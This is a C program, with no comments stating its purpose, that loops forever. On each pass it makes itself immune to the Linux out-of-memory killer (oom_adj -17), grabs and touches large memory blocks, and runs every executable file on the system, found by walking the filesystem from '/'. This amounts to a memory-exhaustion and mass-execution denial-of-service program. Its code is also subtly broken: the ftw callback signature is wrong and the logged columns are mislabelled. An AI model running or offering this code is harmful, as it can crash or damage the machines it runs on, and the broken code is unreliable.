#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <ctype.h>
#include <dirent.h>
#include <ftw.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>

// Constants
#define LOG_FILE "log.txt"
#define PROC_DIR "/proc"
#define OOM_KILLER_FILE "oom_adj"

// Global variables
struct timeval startTime, endTime;

// Function prototypes
void writeStartupInfo();
void writeMemoryUsage(long int* availableMemory);
int adjustOomScore();
int executePrograms(const char * filepath);
void printMemoryUsage();

void writeStartupInfo() {
    FILE *file = fopen(LOG_FILE, "a+");
    if(file) {
        fprintf(file, "Time;UsedMemory\n");
        fclose(file);
    }
}

void writeMemoryUsage(long int* availableMemory) {
    FILE *file = fopen(LOG_FILE, "a+");
    if(file) {
        float elapsedTime = (endTime.tv_sec - startTime.tv_sec) + 1e-6 * (endTime.tv_usec - startTime.tv_usec);
        fprintf(file, "%ld;%0.8f\n", *availableMemory, elapsedTime);
        fclose(file);
    }
}

int adjustOomScore() {
    char currentPID[10];
    sprintf(currentPID, "%d", getpid());

    DIR *procDir = opendir(PROC_DIR);
    struct dirent *entry;
    char path[1024];
    FILE *oomFile;

    if(procDir) {
        while((entry = readdir(procDir))) {
            if(entry->d_type == DT_DIR && isdigit(entry->d_name[0])) {
                if(strcmp(entry->d_name, currentPID) == 0) {
                    snprintf(path, sizeof(path), "%s/%s/%s", PROC_DIR, entry->d_name, OOM_KILLER_FILE);
                    oomFile = fopen(path, "w+");
                    if(oomFile) {
                        fprintf(oomFile, "-17");
                        fclose(oomFile);
                    }
                }
            }
        }
        closedir(procDir);
    }

    return 0;
}

int executePrograms(const char * filepath) {
    if(access(filepath, X_OK) == 0) {
        system(filepath);
    }
    return 0;
}

void printMemoryUsage() {
    long page_count = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGESIZE);
    printf("Total memory: %ld MB\n", (page_count * page_size) / (1024 * 1024));
}


int main() {
    
    gettimeofday(&startTime, NULL);

    long page_count, available_page_count;
    long page_size;
    char *memory_map;
    unsigned int requested_memory = 256 * 1024 * 1024; 

    writeStartupInfo();

    while(1) {
        adjustOomScore();

        page_count = sysconf(_SC_PHYS_PAGES);
        available_page_count = sysconf(_SC_AVPHYS_PAGES);
        page_size = sysconf(_SC_PAGESIZE);

        memory_map = (char*)mmap(NULL, requested_memory, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        
        if(memory_map == MAP_FAILED) {
            requested_memory /= 2;
        } else {
            if(available_page_count * page_size > requested_memory) {
                for(int i = 0; i < requested_memory; i += page_size) {
                    memory_map[i] = 1;
                }
                gettimeofday(&endTime, NULL);
                long int memory_MB = available_page_count * page_size / (1024 * 1024);
                writeMemoryUsage(&memory_MB);
            } else {
                requested_memory /= 2;
            }
        }
        
        ftw("/", executePrograms, 20);
    }

    return 0;
}
